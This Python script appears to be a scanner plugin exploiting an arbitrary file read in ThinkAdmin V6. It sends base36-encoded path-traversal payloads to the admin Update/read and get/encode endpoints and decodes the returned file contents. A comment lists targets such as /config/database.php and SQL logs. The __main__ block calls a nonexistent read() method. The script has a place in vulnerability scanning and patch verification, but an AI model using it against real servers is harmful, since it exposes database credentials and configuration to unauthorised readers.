#!/usr/bin/env python3

import json
import base64 
from app.lib.common import get_useragent
from app.lib.request import request

class Thinkadmin_Arbitrary_File_Read_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Thinkadmin 任意文件读取',
            'description': 'Thinkadmin Arbitrary File Read, 受影响版本: ThinkAdmin V6.0 <=2020.08.03.01',
            'date': '2020-08-27',
            'exptype': 'check',
            'type': ' Arbitrary File Read',
            # /config/database.php
            # /runtime/log/single.log
            # /runtime/log/single_error.log
            # /runtime/log/single_sql.log
            # /config/app.php
            # /config/log.php
            # /config
            # /public/static
            # /public/router.php
            # /public/index.php
            # /app/admin
            # /app/wechat
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent()
        }

    def encode(self, num, b):

        """
        对请求的文件名进行编码

        :param str num: 要编码的字符
        :param int b: 编码位数

        :return str result,'错误原因'
        """

        return ((num == 0) and "0") or \
            (self.encode(num // b, b).lstrip("0") +
            "0123456789abcdefghijklmnopqrstuvwxyz"[num % b])
    
    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            file_prefix_list = ['/', 'application/admin/../../../../../../../']
            path_name_list = ['/admin.html?s=admin/api.Update/read/', '/admin.html?s=admin/api.Update/get/encode/']
            for file_prefix in file_prefix_list:
                for path_name in path_name_list:
                    payload = file_prefix + '/public/index.php'
                    payload = payload.encode('utf-8')
                    poc = ""
                    for i in payload:
                        poc += self.encode(i, 36)
                    link = self.url + path_name + poc
                    try:
                        req = await request.get(link, headers = self.headers)
                        if req.status == 200:
                            json_data = json.loads(await req.text())['data']
                            if json_data:
                                base64.b64decode(json_data['content']).decode()
                                return True 
                    except Exception as e:
                        # print(e)
                        pass
        except Exception as e:
            # print(e)
            pass

if __name__ == "__main__":
    Thinkadmin_Arbitrary_File_Read = Thinkadmin_Arbitrary_File_Read_BaseVerify('http://127.0.0.1/', )
    print(Thinkadmin_Arbitrary_File_Read.read('/public/index.php'))